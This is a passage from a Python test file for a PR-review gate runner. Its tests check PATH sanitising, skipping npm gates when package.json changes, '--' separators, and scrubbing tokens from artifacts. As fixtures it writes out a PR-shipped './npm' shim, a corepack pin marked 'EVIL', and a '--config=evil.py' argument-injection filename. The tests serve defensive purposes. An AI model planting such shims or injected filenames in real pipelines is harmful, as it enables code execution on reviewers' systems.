        )
        # PR-shipped ``./npm`` shim
        (tmp_path / "npm").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        (tmp_path / "npm").chmod(0o755)
        gates = discover_gates(tmp_path, changed_files=())
        npm_gates = [g for g in gates if g.name == "npm:format:check"]
        if not npm_gates:
            return
        gate = npm_gates[0]
        assert Path(gate.cmd[0]).is_absolute()
        resolved = Path(gate.cmd[0]).resolve()
        try:
            resolved.relative_to(tmp_path.resolve())
        except ValueError:
            pass
        else:
            raise AssertionError(
                f"npm runner resolved inside the worktree ({resolved})"
            )

    def test_sanitized_path_strips_dot_and_relative_and_worktree_entries(
        self, tmp_path: Path, monkeypatch: Any
    ) -> None:
        """Iter-40 Finding 1: ``_sanitized_path`` removes any PATH
        entry that resolves inside the worktree, plus ``.`` and any
        non-absolute entry."""
        from pdd.checkup_gates import _sanitized_path

        # Build a malicious PATH that mixes safe entries with risky ones.
        risky_subdir = tmp_path / "bin"
        risky_subdir.mkdir()
        path_entries = [
            "/usr/bin",  # safe absolute
            ".",  # cwd — risky
            "",  # empty — equivalent to cwd
            "relative/path",  # relative — risky
            str(risky_subdir),  # inside worktree — risky
            "/usr/local/bin",  # safe absolute
        ]
        monkeypatch.setenv("PATH", os.pathsep.join(path_entries))
        sanitized = _sanitized_path(tmp_path)
        clean = sanitized.split(os.pathsep)
        assert "/usr/bin" in clean
        assert "/usr/local/bin" in clean
        assert "." not in clean
        assert "" not in clean
        assert "relative/path" not in clean
        assert str(risky_subdir) not in clean

    def test_build_subprocess_env_sets_sanitized_path(
        self, tmp_path: Path, monkeypatch: Any
    ) -> None:
        """Iter-40 Finding 1: the gate runner env MUST use the
        sanitized PATH so node/npm sub-subprocesses (which spawn
        nested tools like prettier via PATH) cannot pick up a PR-
        shipped shim either."""
        from pdd.checkup_gates import _build_subprocess_env

        risky_bin = tmp_path / "shim"
        risky_bin.mkdir()
        monkeypatch.setenv(
            "PATH",
            os.pathsep.join([".", str(risky_bin), "/usr/bin"]),
        )
        env = _build_subprocess_env(tmp_path)
        clean = env["PATH"].split(os.pathsep)
        assert "/usr/bin" in clean
        assert "." not in clean
        assert str(risky_bin) not in clean

    # ------------------------------------------------------------------
    # Iter-40 Finding 2: PR-modified package.json can change
    # ``packageManager`` and corepack downloads/runs the PR-selected
    # version. Skip all npm-family gates on any package.json change.
    # ------------------------------------------------------------------

    def test_npm_gates_skip_when_pr_modifies_package_json(self, tmp_path: Path) -> None:
        """Iter-40 Finding 2: ``packageManager: pnpm@X.Y.Z+sha512:EVIL``
        in PR-modified ``package.json`` makes corepack fetch and run
        the PR-selected version on first invocation. The gate cannot
        statically validate the version pin, so fail closed on any
        PR diff touching ``package.json``."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # Discovery normally emits npm:format:check — but the PR diff
        # touches package.json, so we must skip.
        gates = discover_gates(tmp_path, changed_files=("package.json",))
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_nested_package_json_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-40 Finding 2: monorepo workspaces have nested
        ``packages/foo/package.json`` files that can also pin
        packageManager. The skip uses an endswith check to cover both
        root and nested paths."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("packages/foo/package.json",))
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_still_emit_when_package_json_unchanged(
        self, tmp_path: Path
    ) -> None:
        """Iter-40 Finding 2 regression bound: a PR that changes
        unrelated files (no ``package.json``) must still emit the
        gate. We do not want to disable npm gates on every PR."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("src/foo.ts",))
        names = {g.name for g in gates}
        assert "npm:format:check" in names

    def test_extract_tsc_project_paths_preserves_case(self, tmp_path: Path) -> None:
        """``_extract_tsc_project_paths``
        previously lowercased the whole script command before
        tokenizing. On a case-sensitive filesystem (Linux/CI), a
        script ``tsc -p Config/Build.json --noEmit`` whose path was
        pre-lowercased to ``config/build.json`` would resolve to a
        non-existent file. The downstream chain walk would silently
        return an empty chain, letting a PR-modified
        ``Config/Build.json`` setting ``incremental: true`` slip past
        the tsconfig-emit guard. Only the flag NAMES are case-
        insensitive; the path operand MUST keep its original case.
        """
        from pdd.checkup_gates import _extract_tsc_project_paths

        # Directory shape, mixed case path operand.
        result = _extract_tsc_project_paths(
            "tsc -p Config/Build.json --noEmit", tmp_path
        )
        assert len(result) == 1
        # The resolved path keeps the mixed case the script supplied
        # — Path.resolve() does not lowercase on a case-sensitive FS.
        assert result[0].name == "Build.json"
        assert result[0].parent.name == "Config"
        # `--Project=` upper case (flag is case-insensitive) with
        # case-bearing path operand.
        result2 = _extract_tsc_project_paths(
            "tsc --Project=Config/Build.json", tmp_path
        )
        assert len(result2) == 1
        assert result2[0].name == "Build.json"
        # Quoted form keeps case.
        result3 = _extract_tsc_project_paths('tsc -p "Config/Build.json"', tmp_path)
        assert len(result3) == 1
        assert result3[0].name == "Build.json"

    def test_tsc_chain_signals_emit_from_mixed_case_script_path(
        self, tmp_path: Path
    ) -> None:
        """End-to-end case-sensitivity: a script
        ``tsc -p Config/Build.json --noEmit`` whose ``Config/Build.json``
        sets ``incremental: true`` must skip the tsc-typecheck script
        gate. The case-preserved path is what makes the chain walk
        find the file on a case-sensitive filesystem.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {}}', encoding="utf-8"
        )
        (tmp_path / "Config").mkdir()
        (tmp_path / "Config" / "Build.json").write_text(
            '{"compilerOptions": {"incremental": true}}', encoding="utf-8"
        )
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"typecheck": "tsc -p Config/Build.json --noEmit"}),
            encoding="utf-8",
        )
        # No PR diff touches tsconfig — the only thing keeping the
        # gate from emitting is the chain emit-signal walk finding
        # ``incremental: true`` in the case-bearing custom config.
        gates = discover_gates(tmp_path, changed_files=("src/foo.ts",))
        names = {g.name for g in gates}
        assert "npm:typecheck" not in names


class TestRunGates:
    """``run_gates`` executes each discovered gate and persists artifacts."""

    def test_records_exit_code_and_persists_artifact(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="echo-ok",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 1
        assert results[0].exit_code == 0
        manifest = artifacts_dir / "round-1-review-gates.json"
        assert manifest.exists()
        payload = json.loads(manifest.read_text(encoding="utf-8"))
        assert payload[0]["exit_code"] == 0
        assert payload[0]["gate"]["name"] == "echo-ok"
        per_gate = artifacts_dir / "round-1-review-gate-echo-ok.txt"
        assert per_gate.exists()

    def test_failure_exit_code_recorded(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="echo-fail",
                cmd=[sys.executable, "-c", "import sys; sys.exit(7)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code == 7

    def test_truncates_oversize_output(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Emit ~200KB of stdout; the runner truncates to ~10KB.
        script = "import sys; sys.stdout.write('A' * 200000); sys.exit(1)"
        gates = [
            Gate(
                name="bigout",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        # ~10KB cap, generously bound to allow a small marker like "[truncated]".
        assert len(results[0].stdout_excerpt) <= 12000
        assert results[0].stdout_excerpt  # not empty

    def test_handles_timeout(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Long sleep with a 0.1s timeout: runner must record exit_code=None
        # plus a non-empty error rather than block the loop.
        script = "import time; time.sleep(60)"
        gates = [
            Gate(
                name="hang",
                cmd=[sys.executable, "-c", script],
                source="<test>",
                timeout=0.1,
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code is None
        lowered = results[0].error.lower()
        assert "timeout" in lowered or "timed out" in lowered

    def test_handles_missing_binary(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="ghost",
                cmd=["this-binary-does-not-exist-xyz-1092"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code is None
        assert results[0].error  # non-empty

    def test_scrubs_secrets_in_excerpts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Use ``Authorization: Bearer …`` which the existing scrubber regex
        # recognises, so the runner must consult the loop's scrubber before
        # persisting the excerpt.
        script = (
            "import sys; "
            "sys.stderr.write('error: Authorization: Bearer sk-abcdefghijklmnopqr\\n'); "
            "sys.exit(1)"
        )
        gates = [
            Gate(
                name="leakage",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert "[REDACTED]" in results[0].stderr_excerpt
        assert "sk-abcdefghijklmnopqr" not in results[0].stderr_excerpt
        assert "sk-abcdefghijklmnopqr" not in results[0].stdout_excerpt

    def test_per_file_gate_name_and_source_scrub_when_path_contains_token(
        self, tmp_path: Path
    ) -> None:
        """Iter-25 Finding 1: a PR can change a Python file whose
        path contains a token-shaped substring (e.g.
        ``pkg/ghp_xxx_abcdefghijklmnopqrst.py``). The per-file gate
        names itself ``py-compile:<rel>`` and sets ``source=<rel>``,
        so without scrubbing the token leaks into:
        - the per-gate artifact FILENAME on disk (filename slug)
        - the per-gate artifact BODY (gate:/source: lines)
        - ReviewFinding.reviewer (``gate:<name>``)
        - ReviewFinding.location (``<source>``)
        - ReviewFinding.finding (the message text)
        All five surfaces must be redacted.
        """
        from pdd.checkup_gates import (
            discover_gates,
            gate_results_to_findings,
            run_gates,
        )

        _git_init(tmp_path)
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        # Token-shaped file name (ghp_ + 20+ alphanumeric chars).
        token_path_part = "ghp_AAAAAAAAAAAAAAAAAAAAAA"
        rel = f"pkg/{token_path_part}.py"
        # Bad syntax so the gate FAILS — that's what routes the
        # name/source through the finding adapter.
        (pkg / f"{token_path_part}.py").write_text(
            "this is not python(\n", encoding="utf-8"
        )
        gates = [
            g
            for g in discover_gates(tmp_path, changed_files=(rel,))
            if g.name.startswith("py-compile:")
        ]
        assert gates, "py-compile gate must be discovered"
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts_dir,
            round_number=1,
            mode="review",
        )
        # On-disk per-gate artifact filename: token must not appear.
        files = list(artifacts_dir.glob("round-1-review-gate-*.txt"))
        assert files, "per-gate artifact must be written"
        for f in files:
            assert token_path_part not in f.name, f.name
            assert token_path_part not in f.read_text(encoding="utf-8")
        # Synthetic finding fields: reviewer/location/finding.
        findings = gate_results_to_findings(results, round_number=1)
        assert findings, "failing gate must produce a finding"
        for f in findings:
            assert token_path_part not in (f.reviewer or "")
            assert token_path_part not in (f.location or "")
            assert token_path_part not in (f.finding or "")
            assert token_path_part not in (f.evidence or "")
            assert token_path_part not in (f.required_fix or "")

    def test_ruff_black_mypy_use_double_dash_separator(self, tmp_path: Path) -> None:
        """Iter-25 Finding 2: a PR file named ``--config=evil.py`` (or
        any path starting with ``-``) would be parsed as a flag by
        ruff/black/mypy. Every per-file gate argv MUST include the
        POSIX ``--`` end-of-options separator before the file list so
        the tools treat each entry as a positional path.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        # Enable ruff / black / mypy via pyproject.
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\n[tool.black]\n[tool.mypy]\n",
            encoding="utf-8",
        )
        # Innocuous changed file — the assertion is on the argv shape,
        # not on the tool actually being installed; we only assert
        # when discovery emitted the gate.
        (tmp_path / "foo.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("foo.py",))
        for name in ("ruff", "black", "mypy"):
            matching = [g for g in gates if g.name == name]
            if not matching:  # tool may not be on PATH in the sandbox
                continue
            cmd = matching[0].cmd
            assert "--" in cmd, f"{name} argv missing -- separator: {cmd}"
            # The `--` must precede the file path.
            dash_idx = cmd.index("--")
            path_idx = cmd.index("foo.py")
            assert dash_idx < path_idx, (
                f"{name} `--` must come before the file path: {cmd}"
            )

    def test_manifest_and_to_dict_scrub_nested_gate_metadata(
        self, tmp_path: Path
    ) -> None:
        """Iter-24 Finding 1: ``Gate.to_dict()`` MUST scrub every
        string it serializes — name, every cmd arg, source, and
        required_fix_hint. The dict flows into both the per-round
        JSON manifest and the in-memory state.gate_runs row that
        the review loop persists to final-state.json["gates"], so
        an operator-supplied token in argv that the pre-fix code
        leaked into both surfaces must now be redacted at the
        serialization boundary.
        """
        from pdd.checkup_gates import Gate, GateResult, run_gates

        secret = "ghp_" + ("C" * 40)
        # Use ``echo`` so the gate succeeds and the manifest is
        # actually written. The token rides in argv (and would
        # otherwise be persisted verbatim).
        gates = [
            Gate(
                name="leaky-argv",
                cmd=["echo", f"--token={secret}"],
                source=f"package.json:scripts.token={secret}",
                required_fix_hint=f"Stop committing token={secret}",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts_dir,
            round_number=1,
            mode="review",
        )
        # The scrubbed dict (used for the JSON manifest and the
        # review-loop state row) must be clean across ALL nested
        # fields.
        d = results[0].to_dict()
        # ``cmd`` is now a list of scrubbed strings.
        joined_cmd = " ".join(d["gate"]["cmd"])
        assert secret not in joined_cmd, joined_cmd
        assert secret not in d["gate"]["source"]
        assert secret not in d["gate"]["required_fix_hint"]
        # The on-disk JSON manifest must also be clean.
        manifest = (artifacts_dir / "round-1-review-gates.json").read_text(
            encoding="utf-8"
        )
        assert secret not in manifest

    def test_persistence_failure_scrubs_error_field(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """Iter-24 Finding 2: when per-gate artifact persistence
        raises with a token in the exception text, the resulting
        ``GateResult.error`` MUST be scrubbed before it lands in
        the manifest / state.gate_runs row, and the WARNING log
        line MUST also be scrubbed.
        """
        from pdd.checkup_gates import Gate, run_gates

        secret = "ghp_" + ("D" * 40)
        gates = [
            Gate(
                name="ok-then-disk-fail",
                cmd=["echo", "hi"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = type(artifacts_dir).write_text

        def fail_write(self, *args, **kwargs):
            # Per-gate write fails with an exception text that
            # carries a secret.
            if "round-1-review-gate-" in self.name:
                raise OSError(f"disk full while writing {secret}")
            return original_write_text(self, *args, **kwargs)

        monkeypatch.setattr(Path, "write_text", fail_write)

        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts_dir,
            round_number=1,
            mode="review",
        )
        assert results[0].error
        # The error field landed in the manifest and in
        # ReviewFinding.evidence; must be scrubbed.
        assert secret not in (results[0].error or "")
        # The manifest itself reads the (now scrubbed) error.
        manifest_text = (artifacts_dir / "round-1-review-gates.json").read_text(
            encoding="utf-8"
        )
        assert secret not in manifest_text

    def test_runner_error_scrubs_secrets_in_synthetic_finding_evidence(
        self, tmp_path: Path
    ) -> None:
        """Iter-23 Finding 2: when a gate cmd contains an
        operator-supplied token (e.g. a fork PR poisons
        ``package.json`` with a token literal in a script body) and
        the runner crashes (``FileNotFoundError``,
        ``TimeoutExpired``, generic ``Exception``), the resulting
        ``GateResult.error`` includes the full argv tuple. That
        string flows into ``ReviewFinding.evidence`` which is
        rendered into the public PR comment AND persisted to
        final-state.json. Scrub at the source so no downstream
        consumer ever sees the raw token.
        """
        from pdd.checkup_gates import (
            Gate,
            gate_results_to_findings,
            run_gates,
        )

        secret = "ghp_" + ("B" * 40)
        gates = [
            Gate(
                # Missing binary so the runner hits FileNotFoundError;
                # the secret rides along in argv.
                name="leaky-runner",
                cmd=[
                    "/nonexistent-binary-pls-fail",
                    f"--token={secret}",
                ],
                source="package.json:scripts.format:check",
            )
        ]
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=tmp_path / "artifacts",
            round_number=1,
            mode="review",
        )
        assert results[0].exit_code is None  # runner-error path
        # GateResult.error itself MUST be scrubbed.
        assert secret not in (results[0].error or "")
        # Synthetic ReviewFinding.evidence MUST NOT leak the token.
        findings = gate_results_to_findings(results, round_number=1)
        assert findings, "runner error must produce a finding"
        for f in findings:
            assert secret not in (f.evidence or "")
            assert secret not in (f.required_fix or "")
        # Per-gate artifact MUST also be clean.
        artifact = (
            tmp_path / "artifacts" / "round-1-review-gate-leaky-runner.txt"
        ).read_text(encoding="utf-8")
        assert secret not in artifact

    def test_secret_at_truncation_boundary_is_scrubbed(self, tmp_path: Path) -> None:
        """Iter-22 Finding 1: a secret that lands near the 10KB
        truncation boundary must still be redacted. Pre-fix the runner
        called ``_scrub(_truncate(text))`` — truncation could leave a
        partial-token prefix that the scrub regex (anchored on the full
        token shape) no longer matched. The correct order is
        ``_truncate(_scrub(text))``: scrub the full output first.
        """
        from pdd.checkup_gates import Gate, _EXCERPT_LIMIT, run_gates

        # Pad stdout past _EXCERPT_LIMIT, then emit a full token at
        # the boundary so the previous truncate-first order would
        # chop the token mid-pattern and dodge the scrubber.
        padding = "x" * (_EXCERPT_LIMIT - 4)
        # ``ghp_`` + 36 chars satisfies the GitHub PAT regex
        # (``ghp_[A-Za-z0-9]{20,}``). Construct the literal at runtime
        # via ``chr()`` so it does not appear in argv (the per-gate
        # artifact also dumps the cmd line; we want this test focused
        # on the output-excerpt scrub-before-truncate contract, not on
        # operator-supplied argv leakage).
        secret_expr = "chr(103)+chr(104)+chr(112)+chr(95)+'A'*40"  # 'ghp_' + 40*A
        script = (
            f"import sys; sys.stdout.write({padding!r} + ({secret_expr})); sys.exit(0)"
        )
        gates = [
            Gate(
                name="boundary-leak",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        excerpt = results[0].stdout_excerpt
        # No part of the token survives — including a truncated
        # prefix like ``ghp_AAA`` that the pre-fix order would have
        # left in place.
        expected_secret = "ghp_" + ("A" * 40)
        assert expected_secret not in excerpt
        assert "ghp_" not in excerpt
        # The on-disk artifact MUST also be clean (it's written from
        # the same scrubbed/truncated string).
        artifact_text = (
            artifacts_dir / "round-1-review-gate-boundary-leak.txt"
        ).read_text(encoding="utf-8")
        assert "ghp_" not in artifact_text

    def test_runs_with_ci_env_and_no_color(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # The runner must inject CI=1, NO_COLOR=1, FORCE_COLOR=0 so deterministic
        # gates emit non-interactive output. Probe via a dump-env gate.
        script = (
            "import os, sys; "
            "sys.stdout.write("
            "f\"CI={os.environ.get('CI')}|"
            "NO_COLOR={os.environ.get('NO_COLOR')}|"
            "FORCE_COLOR={os.environ.get('FORCE_COLOR')}\""
            "); sys.exit(0)"
        )
        gates = [
            Gate(
                name="env-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert "CI=1" in results[0].stdout_excerpt
        assert "NO_COLOR=1" in results[0].stdout_excerpt
        assert "FORCE_COLOR=0" in results[0].stdout_excerpt

    def test_strips_pdd_env_so_gate_does_not_inherit_loop_state(
        self, tmp_path: Path, monkeypatch: Any
    ) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Set a PDD_* env that must NOT leak into the gate process.
        monkeypatch.setenv("PDD_FAKE_SECRET", "must-not-appear")
        script = (
            "import os, sys; "
            "sys.stdout.write(os.environ.get('PDD_FAKE_SECRET', '<unset>')); "
            "sys.exit(0)"
        )
        gates = [
            Gate(
                name="pdd-env-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].stdout_excerpt.strip() == "<unset>"

    def test_uses_worktree_as_cwd(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        script = "import os, sys; sys.stdout.write(os.getcwd()); sys.exit(0)"
        gates = [
            Gate(
                name="cwd-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        # tmp_path may be a symlink on macOS; resolve both sides for comparison.
        emitted = Path(results[0].stdout_excerpt.strip()).resolve()
        assert emitted == tmp_path.resolve()

    def test_run_gates_handles_artifact_write_failure_as_gate_result(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """Codex review iteration 1, Finding 3: an artifact persistence error
        must not crash ``run_gates`` or lose the result row — it must be
        recorded as a runner-side failure on that specific gate with a
        useful ``error`` field so the audit trail remains visible.
        """
        import pdd.checkup_gates as gates_mod

        gates = [
            gates_mod.Gate(
                name="ok-gate",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            ),
            gates_mod.Gate(
                name="ok-gate-2",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            ),
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = Path.write_text

        def fake_write_text(self: Path, *a: Any, **k: Any):
            # Fail only on the per-gate text artifact for the first gate.
            if "round-1-review-gate-ok-gate.txt" in self.name:
                raise PermissionError("disk full")
            return original_write_text(self, *a, **k)

        monkeypatch.setattr(Path, "write_text", fake_write_text)

        results = gates_mod.run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 2
        # The first gate gets a runner-error marker on the persistence
        # failure, even though the subprocess itself exited 0.
        first = results[0]
        assert first.exit_code is None
        assert first.error and (
            "permissionerror" in first.error.lower()
            or "disk full" in first.error.lower()
        )
        # The second gate still records its successful run.
        second = results[1]
        assert second.exit_code == 0

    def test_run_gates_survives_manifest_write_failure(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """The manifest is best-effort: when it fails, the call returns
        every collected ``GateResult`` and does not raise.
        """
        import pdd.checkup_gates as gates_mod

        gates = [
            gates_mod.Gate(
                name="ok-gate",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = Path.write_text

        def fake_write_text(self: Path, *a: Any, **k: Any):
            if self.name.endswith("review-gates.json"):
                raise PermissionError("manifest disk full")
            return original_write_text(self, *a, **k)

        monkeypatch.setattr(Path, "write_text", fake_write_text)
        results = gates_mod.run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 1
        assert results[0].exit_code == 0


class TestGateResultsToFindings:
    """``gate_results_to_findings`` converts failing gates to ``ReviewFinding``."""

    def test_failed_gate_becomes_blocker_finding(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="prettier-check",
            cmd=["prettier", "--check", "."],
            source="package.json:scripts.format:check",
            required_fix_hint="Run prettier --write . locally and commit.",
        )
        result = GateResult(
            gate=gate,
            exit_code=1,
            stdout_excerpt="Code style issues found in 2 files.",
            stderr_excerpt="",
            duration_seconds=0.5,
            started_at_iso="2025-01-01T00:00:00Z",
        )
        findings = gate_results_to_findings([result], round_number=2)
        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "blocker"
        assert finding.reviewer == "gate:prettier-check"
        assert finding.area == "deterministic-gate"
        assert (
            "prettier --check" in finding.required_fix.lower()
            or "prettier --write" in finding.required_fix.lower()
        )
        evidence_lower = finding.evidence.lower()
        assert "exit code 1" in evidence_lower or "exit_code=1" in evidence_lower
        assert finding.location == "package.json:scripts.format:check"
        assert finding.round_number == 2
        assert finding.status == "open"

    def test_passed_gates_skipped(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(name="ok", cmd=["true"], source="<test>")
        passing = GateResult(
            gate=gate,
            exit_code=0,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=0.01,
            started_at_iso="2025-01-01T00:00:00Z",
        )
        findings = gate_results_to_findings([passing], round_number=1)
        assert findings == []

    def test_runner_side_error_becomes_finding(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(name="hang", cmd=["sleep", "10"], source="<test>")
        result = GateResult(
            gate=gate,
            exit_code=None,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=0.1,
            started_at_iso="2025-01-01T00:00:00Z",
            error="timed out after 0.1s",
        )
        findings = gate_results_to_findings([result], round_number=1)
        assert len(findings) == 1
        assert findings[0].severity == "blocker"
        evidence_lower = findings[0].evidence.lower()
        assert "timed out" in evidence_lower or "timeout" in evidence_lower

    def test_dedup_key_is_stable_across_rounds(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="prettier-check",
            cmd=["prettier", "--check", "."],
            source="package.json:scripts.format:check",
        )
        r1 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=1,
                    stdout_excerpt="A",
                    stderr_excerpt="",
                    duration_seconds=0.5,
                    started_at_iso="2025-01-01T00:00:00Z",
                )
            ],
            round_number=1,
        )
        r2 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=1,
                    stdout_excerpt="B",
                    stderr_excerpt="",
                    duration_seconds=0.5,
                    started_at_iso="2025-01-01T00:00:01Z",
                )
            ],
            round_number=2,
        )
        assert r1[0].key == r2[0].key

    def test_gate_runner_error_finding_key_stable_across_rounds_with_volatile_error(
        self,
    ) -> None:
        """Codex review iteration 2, Finding 1: the runner-error finding's
        ``finding`` text MUST NOT embed ``result.error`` because that field
        carries volatile detail (paths, exception ``[Errno N]`` codes, etc.)
        that varies across rounds. ``ReviewFinding.key`` is built from
        ``severity|location|finding|required_fix``; an embedded volatile
        ``error`` breaks the dedup contract documented in
        ``pdd/prompts/checkup_gates_python.prompt`` and tested by
        ``test_dedup_key_is_stable_across_rounds`` for the
        exit_code != 0 branch.
        """
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="persist-fail",
            cmd=["true"],
            source="<test>",
        )
        r1 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=None,
                    stdout_excerpt="",
                    stderr_excerpt="",
                    duration_seconds=0.1,
                    started_at_iso="2026-01-01T00:00:00Z",
                    error=(
                        "PermissionError: [Errno 13] Permission denied: "
                        "/tmp/round-1-review-gate-persist-fail.txt"
                    ),
                )
            ],
            round_number=1,
        )
        r2 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=None,
                    stdout_excerpt="",
                    stderr_excerpt="",
                    duration_seconds=0.1,
                    started_at_iso="2026-01-01T00:00:05Z",
                    error=(
                        "PermissionError: [Errno 13] Permission denied: "
                        "/tmp/round-2-review-gate-persist-fail.txt"
                    ),
                )
            ],
            round_number=2,
        )
        assert r1[0].key == r2[0].key, (
            "runner-error finding keys MUST match across rounds despite "
            "round-specific paths in ``result.error``; otherwise the loop "
            "produces a duplicate finding row every round.\n"
            f"r1.key={r1[0].key!r}\nr2.key={r2[0].key!r}"
        )
        # The volatile error text MUST still appear in evidence so the
        # operator can still see the actual failure detail.
        assert "PermissionError" in r1[0].evidence
        assert "/tmp/round-1-review-gate-persist-fail.txt" in r1[0].evidence


class TestDocContractCheck:
    """Tests for the doc-contract gate discovery and run_doc_contract_check verification logic."""

    def test_discover_emits_doc_contract_gate(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "doc-contract" in names

    def test_run_doc_contract_check_passes_when_no_changes(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)
        # Create dummy README.md and prompts files so they exist
        (tmp_path / "README.md").write_text("# README\n", encoding="utf-8")
        (tmp_path / "pdd").mkdir(parents=True, exist_ok=True)
        (tmp_path / "pdd" / "prompts").mkdir(parents=True, exist_ok=True)
        (tmp_path / "pdd" / "prompts" / "sync_orchestration_python.prompt").write_text("", encoding="utf-8")
        (tmp_path / "pdd" / "construct_paths.py").write_text("_PDDRC_DEFAULTS_KEYS = set()\n", encoding="utf-8")

        # Commit them so diff is clean
